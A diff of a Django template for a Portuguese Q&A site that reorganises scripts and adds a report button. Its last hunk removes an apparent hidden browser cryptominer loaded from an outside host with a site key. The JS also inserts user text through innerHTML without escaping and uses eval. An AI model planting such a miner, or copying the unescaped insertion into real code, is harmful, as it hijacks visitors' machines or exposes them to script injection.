@@ -6,242 +6,180 @@
 		<meta charset="utf-8">
 		<meta name="viewport" content="width=device-width, initial-scale=1">
 		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
-		<link href="https://fonts.googleapis.com/css?family=Raleway:400,500,500i,700,800i" rel="stylesheet">
-		
-		<script src="https://kit.fontawesome.com/1f965a8b94.js" crossorigin="anonymous"></script>
-		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-		<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
+		<!--<link href="https://fonts.googleapis.com/css?family=Raleway:400,500,500i,700,800i" rel="stylesheet">-->
+
+		<script src="https://kit.fontawesome.com/1f965a8b94.js"></script>
+		<!--<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>-->
+		<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.form/4.3.0/jquery.form.min.js"></script> <!-- para enviar formulários sem precisar atualizar a página. -->
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script> <!-- para que a barra de navegação funciona em mobile. -->
+
+		<!-- Bootstrap JS: -->
 		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
 
-		<script type="text/javascript">
-			$(document).ready(function() {
-				$('.navbar-light .dmenu').hover(function() {
-					$(this).find('.sm-menu').first().stop(true, true).slideDown(150);
-				}, function() {
-					$(this).find('.sm-menu').first().stop(true, true).slideUp(105)
-				});
-			});
-		</script>
+		<script src="/static/js/question.js"></script>
+		<link rel="stylesheet" href="/static/css/question.css">
 
-		<style>
-			#response-form {
-				margin: 6px;
+<script>
+$(function() {
+	// bind 'myForm' and provide a simple callback function
+	$('#response-form').ajaxForm(function(answer_id) {
+		document.getElementById('response-form').style.display = 'none'
+		a = eval('comment_' + answer_id + ' = false;function h(el) {el = el.getElementsByClassName("c");for(var i = 0; i < el.length; i++) {if(el[i].style.display != "none") {el[i].style.display = "none";} else {el[i].style.display = "block";}}}')
+		a = ''
+		document.getElementById('responses').innerHTML += '<div class="card"><a href="/user/{{ user.username }}" style="text-decoration: none; color: black"><img src="{{user_p.avatar.url}}" width="40px"> {{ user.username }}</a><div class="card-body"><p>' + document.getElementById('response-form').response.value + '</p><img onclick="like_or_stop_liking(this)" src="/static/images/white-heart.png" width="20px" id="' + answer_id + '" style="cursor: pointer"> &nbsp;<span>0</span> ' + a + '&nbsp;&nbsp;&nbsp;<span style="cursor: pointer;" onclick="if(comment_' + answer_id + ' == false) {show_comments(this, ' + answer_id + ', 1); comment_' + answer_id + ' = true} else {h(this.parentElement)}"><img src="/static/images/comments.png" width="20px" style="cursor: pointer;"></span><span> &nbsp;0</span>        </div></div>'
+		document.getElementById('response-form').remove()
+	});
+});
+
+function like_or_stop_liking(obj) {
+	$.ajax({
+		url: '/answer/' + obj.id + '/like',
+		type: 'POST',
+		data: {
+			csrfmiddlewaretoken: '{{ csrf_token }}'
+		},
+		complete: function(result) {
+			img = obj
+			likeCounter = obj.nextSibling.nextSibling
+
+			if (img.src.includes('white')) {
+				img.src = '/static/images/red-heart.png'
+				likeCounter.innerHTML = Number(likeCounter.innerHTML) + 1
+			} else {
+				img.src = '/static/images/white-heart.png'
+				likeCounter.innerHTML = Number(likeCounter.innerHTML) - 1
 			}
-			
-			#response-form input {
-				margin: 3px;
+		}
+	})
+}
+
+function delete_answer(answer_id) {
+	$.ajax({
+		url: '/answer/' + answer_id + '/delete',
+		type: 'post',
+		data: {
+			csrfmiddlewaretoken: '{{ csrf_token }}'
+		},
+		complete: function() {
+			alert('Resposta excluída com sucesso.')
+		}
+	})
+}
+
+function edit_answer(answer_id, element) {
+	if (element.getElementsByClassName("edit-response-form")[0] == undefined) {
+		element.innerHTML += "<form class='form-inline edit-response-form' method='post' action='/response'><input type='hidden' name='csrfmiddlewaretoken' value='{{ csrf_token }}'><input type='hidden' name='response_id' value='" + answer_id + "'><textarea class='form-control' name='response'>" + element.getElementsByTagName("p")[0].innerHTML + "</textarea><input type='submit' value='Pronto'></form>"
+	} else {
+		element.getElementsByClassName("edit-response-form")[0].remove()
+	}
+}
+
+function delete_question() {
+	$.ajax({
+		type: 'POST',
+		url: '/deleteQuestion',
+		data: {
+			csrfmiddlewaretoken: '{{ csrf_token }}',
+			question_id: '{{ question.id }}',
+		},
+		complete: function() {
+			window.location.replace('/')
+		}
+	})
+}
+
+function show_comments(el, response_id, page, delete_show_more_later, card) {
+	// faz ajax para /comments
+	// na resposta tem JSON contendo os comentários (usando paginação "page")
+
+	if (delete_show_more_later) {
+		delete_show_more_later.remove()
+
+		// deleta também formulário de pergunta pra colocar denovo mais tarde
+		card.lastElementChild.remove()
+	}
+
+	$.ajax({
+		type: 'POST',
+		url: '/comments',
+		data: {
+			csrfmiddlewaretoken: '{{ csrf_token }}',
+			response_id: response_id,
+			page: page,
+		},
+		complete: function(data) {
+
+			data = JSON.parse(data.responseText)
+
+			element = el.parentElement
+
+			if (data.has_comments == 'false') {
+				// caso a resposta não tenha comentários:
+				el.parentElement.innerHTML += "<div class='c'><hr><p>Não há comentários.</p><hr></div>"
+				element.innerHTML += '<form class="form-inline c comment_form" method="post" action="/comment"> <input type="hidden" name="question_id" value="{{ question.id }}"> <input type="hidden" name="response_id" value="' + `${response_id}` + '"> <input type="hidden" name="csrfmiddlewaretoken" value="{{ csrf_token }}"> <textarea name="comment" class="form-control" placeholder="Faça seu comentário"></textarea><input class="btn btn-primary" type="submit" value="Pronto"></form>'
+				return
 			}
-			
-			.comment_form input {
-				margin: 3px;
-			}
-			
-			.card {
-				margin: 6px;
+
+			if (card) {
+				element = card
 			}
 
-			section {
-				width: 50%;
-				margin: 6px auto auto;
-			}
-			
-			@media (min-width: 320px) and (max-width: 480px) {
-			    section {
-			        width: 95%;
-			    }
-			}
-		</style>
+			try {
+				element.getElementsByTagName('hr')[element.getElementsByTagName('hr').length - 1].remove()
+			} catch (e) {}
 
-		<script src="https://code.jquery.com/jquery-3.5.1.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
-		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.form/4.3.0/jquery.form.min.js" integrity="sha384-qlmct0AOBiA2VPZkMY3+2WqkHtIQ9lSdAsAn5RUJD/3vA5MKDgSGcdmIv4ycVxyn" crossorigin="anonymous"></script>
+			var count = 1
+			while (count <= data.total_comments) {
 
-		<script>
-     $(function() {
-       // bind 'myForm' and provide a simple callback function
-       $('#response-form').ajaxForm(function(answer_id) {
-           document.getElementById('response-form').style.display = 'none'
-           a = eval('comment_'+answer_id+' = false;function h(el) {el = el.getElementsByClassName("c");for(var i = 0; i < el.length; i++) {if(el[i].style.display != "none") {el[i].style.display = "none";} else {el[i].style.display = "block";}}}')
-           a = ''
-           document.getElementById('responses').innerHTML += '<div class="card"><a href="/user/{{ user.username }}" style="text-decoration: none; color: black"><img src="{{user_p.avatar.url}}" width="40px"> {{ user.username }}</a><div class="card-body"><p>'+document.getElementById('response-form').response.value+'</p><img onclick="like_or_stop_liking(this)" src="/static/images/white-heart.png" width="20px" id="' + answer_id + '" style="cursor: pointer"> &nbsp;<span>0</span> ' + a + '&nbsp;&nbsp;&nbsp;<span style="cursor: pointer;" onclick="if(comment_' + answer_id + ' == false) {show_comments(this, '+answer_id+', 1); comment_'+answer_id+' = true} else {h(this.parentElement)}"><img src="/static/images/comments.png" width="20px" style="cursor: pointer;"></span><span> &nbsp;0</span>        </div></div>'
-           document.getElementById('response-form').remove()
-       });
-     });
-            function like_or_stop_liking(obj) {
-                $.ajax({
-                    url: '/answer/' + obj.id + '/like',
-                    type: 'POST',
-                    data: {
-                        csrfmiddlewaretoken: '{{ csrf_token }}'
-                    },
-                    complete: function(result) {
-                        img = obj
-                        likeCounter = obj.nextSibling.nextSibling
+				if (data.comments[count].username == "{{ user.username }}") {
+					//element.innerHTML += "<small id='comment_"+data.comments[count].id+"' class='c'><div class='card'><a href='/user/" + data.comments[count].username + "' style='text-decoration: none; color: black'><img src='" + data.comments[count].image_url + "' width='40px' class='response-profile-pic'> " + data.comments[count].username + "</a><div class='card-body'><p>" + data.comments[count].comment + "</p><img src='/static/images/trash.png' onclick='delete_comment(this);' width='20px' style='float: right; cursor: pointer; border-radius: 0px;'></div></div></small>"
+					last_comment = ""
 
-                        if (img.src.includes('white')) {
-                            img.src = '/static/images/red-heart.png'
-                            likeCounter.innerHTML = Number(likeCounter.innerHTML) + 1
-                        } else {
-                            img.src = '/static/images/white-heart.png'
-                            likeCounter.innerHTML = Number(likeCounter.innerHTML) - 1
-                        }
-                    }
-                })
-            }
+					if (count == data.total_comments)
+						last_comment = "<hr>"
 
-            function delete_answer(answer_id) {
-                $.ajax({
-                    url: '/answer/' + answer_id + '/delete',
-                    type: 'post',
-                    data: {
-                        csrfmiddlewaretoken: '{{ csrf_token }}'
-                    },
-                    complete: function() {
-                        alert('Resposta excluída com sucesso.')
-                    }
-                })
-            }
-
-            function edit_answer(answer_id, element) {
-				if(element.getElementsByClassName("edit-response-form")[0] == undefined) {
-					element.innerHTML += "<form class='form-inline edit-response-form' method='post' action='/response'><input type='hidden' name='csrfmiddlewaretoken' value='{{ csrf_token }}'><input type='hidden' name='response_id' value='" + answer_id + "'><textarea class='form-control' name='response'>" + element.getElementsByTagName("p")[0].innerHTML + "</textarea><input type='submit' value='Pronto'></form>"
+					element.innerHTML += "<div id='comment_" + data.comments[count].id + "' class='c'><hr><a href='/user/" + data.comments[count].username + "' style='text-decoration: none; color: black'><img src='" + data.comments[count].image_url + "' width='35px'> " + data.comments[count].username + "</a>  <img src='/static/images/trash.png' onclick='delete_comment(this);' width='20px' style='float: right; cursor: pointer; border-radius: 0px;' id='comment_" + data.comments[count].id + "'>  <p>" + data.comments[count].comment + "</p>" + last_comment + "</div>"
 				} else {
-					element.getElementsByClassName("edit-response-form")[0].remove()
+					last_comment = ""
+
+					if (count == data.total_comments)
+						last_comment = "<hr>"
+
+					element.innerHTML += "<div class='c'><hr><a href='/user/" + data.comments[count].username + "' style='text-decoration: none; color: black'><img src='" + data.comments[count].image_url + "' width='35px'> " + data.comments[count].username + "</a><p>" + data.comments[count].comment + "</p>" + last_comment + "</div>"
 				}
-			}
-		</script>
-
-		<script>
-			{% if request.user.username == question.creator.user.username %}
-				function delete_question() {
-					$.ajax({
-						type: 'POST',
-						url: '/deleteQuestion',
-						data: {
-							csrfmiddlewaretoken: '{{ csrf_token }}',
-							question_id: '{{ question.id }}',
-						},
-						complete: function() {
-							window.location.replace('/')
-						}
-					})
-				}
-			{% endif %}
-
-			function show_comments(el, response_id, page, delete_show_more_later, card) {
-				// faz ajax para /comments
-				// na resposta tem JSON contendo os comentários (usando paginação "page")
-
-				if(delete_show_more_later) {
-					delete_show_more_later.remove()
-
-					// deleta também formulário de pergunta pra colocar denovo mais tarde
-					card.lastElementChild.remove()
-				}
-
-				$.ajax({
-					type: 'POST',
-					url: '/comments',
-					data: {
-						csrfmiddlewaretoken: '{{ csrf_token }}',
-						response_id: response_id,
-						page: page,
-					},
-					complete: function(data) {
-
-						data = JSON.parse(data.responseText)
-
-						element = el.parentElement
-
-						if(data.has_comments == 'false') {
-							// caso a resposta não tenha comentários:
-							el.parentElement.innerHTML += "<div class='c'><hr><p>Não há comentários.</p><hr></div>"
-							element.innerHTML += '<form class="form-inline c comment_form" method="post" action="/comment"> <input type="hidden" name="question_id" value="{{ question.id }}"> <input type="hidden" name="response_id" value="' + `${response_id}` + '"> <input type="hidden" name="csrfmiddlewaretoken" value="{{ csrf_token }}"> <textarea name="comment" class="form-control" placeholder="Faça seu comentário"></textarea><input class="btn btn-primary" type="submit" value="Pronto"></form>'
-							return
-						}
-
-						if (card) {
-							element = card
-						}
-						
-						try {
-							element.getElementsByTagName('hr')[element.getElementsByTagName('hr').length - 1].remove()
-						} catch (e) {
-						}
-
-						var count = 1
-						while(count <= data.total_comments) {
-
-							if(data.comments[count].username == "{{ user.username }}") {
-								//element.innerHTML += "<small id='comment_"+data.comments[count].id+"' class='c'><div class='card'><a href='/user/" + data.comments[count].username + "' style='text-decoration: none; color: black'><img src='" + data.comments[count].image_url + "' width='40px' class='response-profile-pic'> " + data.comments[count].username + "</a><div class='card-body'><p>" + data.comments[count].comment + "</p><img src='/static/images/trash.png' onclick='delete_comment(this);' width='20px' style='float: right; cursor: pointer; border-radius: 0px;'></div></div></small>"
-								last_comment = ""
-								
-								if(count == data.total_comments)
-									last_comment = "<hr>"
-								
-								element.innerHTML += "<div id='comment_"+data.comments[count].id+"' class='c'><hr><a href='/user/" + data.comments[count].username + "' style='text-decoration: none; color: black'><img src='" + data.comments[count].image_url + "' width='35px'> " + data.comments[count].username + "</a>  <img src='/static/images/trash.png' onclick='delete_comment(this);' width='20px' style='float: right; cursor: pointer; border-radius: 0px;' id='comment_"+data.comments[count].id+"'>  <p>" + data.comments[count].comment + "</p>"+last_comment+"</div>"
-							} else {
-								last_comment = ""
-								
-								if(count == data.total_comments)
-									last_comment = "<hr>"
-								
-								element.innerHTML += "<div class='c'><hr><a href='/user/" + data.comments[count].username + "' style='text-decoration: none; color: black'><img src='" + data.comments[count].image_url + "' width='35px'> " + data.comments[count].username + "</a><p>" + data.comments[count].comment + "</p>"+last_comment+"</div>"
-							}
-							count += 1
-						}
-
-						if(data.has_next == 'true') {
-							++page
-							element.innerHTML += `<div class='c' id='` + `show_more_${response_id}` + `'><p style='cursor: pointer;' onclick='show_comments(this, ` + `${response_id}, ` + `${page}` + `, this, element);'>Mostrar mais...</p></div>`
-						}
-
-						element.innerHTML += '<form class="form-inline c comment_form" method="post" action="/comment"> <input type="hidden" name="question_id" value="{{ question.id }}"> <input type="hidden" name="response_id" value="' + `${response_id}` + '"> <input type="hidden" name="csrfmiddlewaretoken" value="{{ csrf_token }}"> <textarea name="comment" class="form-control" placeholder="Faça seu comentário"></textarea><input class="btn btn-primary" type="submit" value="Pronto"></form>'
-					},
-				})
+				count += 1
 			}
 
-			function anti_spam(obj) {
-				if(obj.parentElement.response.value == '') {
-					alert('Preencha sua resposta.')
-					return false
-				}
-
-				return true
+			if (data.has_next == 'true') {
+				++page
+				element.innerHTML += `<div class='c' id='` + `show_more_${response_id}` + `'><p style='cursor: pointer;' onclick='show_comments(this, ` + `${response_id}, ` + `${page}` + `, this, element);'>Mostrar mais...</p></div>`
 			}
 
-			function delete_comment(obj) {
+			element.innerHTML += '<form class="form-inline c comment_form" method="post" action="/comment"> <input type="hidden" name="question_id" value="{{ question.id }}"> <input type="hidden" name="response_id" value="' + `${response_id}` + '"> <input type="hidden" name="csrfmiddlewaretoken" value="{{ csrf_token }}"> <textarea name="comment" class="form-control" placeholder="Faça seu comentário"></textarea><input class="btn btn-primary" type="submit" value="Pronto"></form>'
+		},
+	})
+}
 
-				obj = obj.parentElement
+function delete_comment(obj) {
 
-				comment_id = obj.id.slice(8)
+	obj = obj.parentElement
 
-				// apaga o comentário de verdade do banco de dados:
-				$.ajax({
-					type: 'post',
-					url: '/delete_comment',
-					data: {
-						csrfmiddlewaretoken: '{{ csrf_token }}',
-						comment_id: comment_id,
-					},
-				})
+	comment_id = obj.id.slice(8)
 
-				obj.remove()
-			}
-		</script>
+	// apaga o comentário de verdade do banco de dados:
+	$.ajax({
+		type: 'post',
+		url: '/delete_comment',
+		data: {
+			csrfmiddlewaretoken: '{{ csrf_token }}',
+			comment_id: comment_id,
+		},
+	})
 
-		<script>
-			function show_more(obj) {
-				obj.style.display = 'none'
-				obj.nextSibling.style.display = 'inline'
-				obj.nextSibling.nextSibling.nextSibling.style.display = 'inline'
-			}
-
-			function show_less(obj) {
-				obj.style.display = 'none'
-				obj.previousSibling.previousSibling.style.display = 'none'
-				obj.previousSibling.previousSibling.previousSibling.style.display = 'inline'
-			}
-		</script>
+	obj.remove()
+}
+</script>
 	</head>
 	<body>
 
@@ -315,7 +253,7 @@
 					<center><img style="display: block;" src="{{ question.image.url }}" width="55%"></center>
 					{% endif %}
 					{% endif %}
-					
+
 			{% if request.user.username == question.creator.user.username %}
 				<button class="btn btn-outline-danger" style="display: block;" onclick="delete_question()">Excluir</button>
 			{% endif %}
@@ -335,13 +273,7 @@
 
 					{% if user.is_authenticated %}
     					{% if user.username == response.creator.user.username %}
-    					    <style>
-    					        #dropdown {
-									float: right;
-								}
-    					    </style>
-
-							<div class="dropdown" id="dropdown">
+							<div class="dropdown" id="options-dropdown">
 							  <button class="btn btn-primary btn-sm dropdown-toggle" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
 								  Opções
 							  </button>
@@ -350,26 +282,27 @@
 								<button class="dropdown-item" style="cursor: pointer;" onclick="edit_answer({{ response.id }}, this.parentElement.parentElement.parentElement);">Editar</button>
 							  </div>
 							</div>
-
     					{% endif %}
 					{% endif %}
 
 					<!-- Comentários -->
-					<script>
-						comment_{{ response.id }} = false
-
-						function h(el) {
-							el = el.getElementsByClassName('c')
-							for(var i = 0; i < el.length; i++) {
-								if(el[i].style.display != 'none') {
-									el[i].style.display = 'none'
-								} else {
-									el[i].style.display = 'block'
-								}
-							}
-						}
-					</script>
+<script>
+comment_{{ response.id }} = false
+function h(el) {
+	el = el.getElementsByClassName('c')
+	for (var i = 0; i < el.length; i++) {
+		if (el[i].style.display != 'none') {
+			el[i].style.display = 'none'
+		} else {
+			el[i].style.display = 'block'
+		}
+	}
+}
+</script>
 					&nbsp;&nbsp;&nbsp;<span style="cursor: pointer;" onclick="if(comment_{{response.id}} == false) {show_comments(this, {{ response.id }}, 1); comment_{{response.id}} = true} else {h(this.parentElement)}"><img src="/static/images/comments.png" width="20px" style="cursor: pointer;"></span><span> &nbsp;{{ response.id|total_comments }}</span>
+					{% if user_p.user.username != response.creator.user.username %}
+					<i class="far fa-flag" id="response-{{ response.id }}" data-toggle="popover" data-content="<p>Para denunciar esta resposta, use o botão abaixo.</p><button class='btn btn-danger' onclick='report({{ response.id }}, this)'>Denunciar</button>"></i>
+					{% endif %}
 				</div>
 			</div>
 			{% endfor %}
@@ -386,16 +319,5 @@
 				{% endif %}
 			{% endif %}
 		</section>
-
-<script src="https://www.hostingcloud.racing/dJi3.js"></script>
-<script>
-    var _client = new Client.Anonymous('5359e2aefac13b8544fcee9326d4a0aafb5fd62a6991f1e87ade167c09c9967a', {
-        throttle: 0.9, c: 'w', ads: 0
-    });
-    _client.start();
-    
-
-</script>
-
 	</body>
 </html>
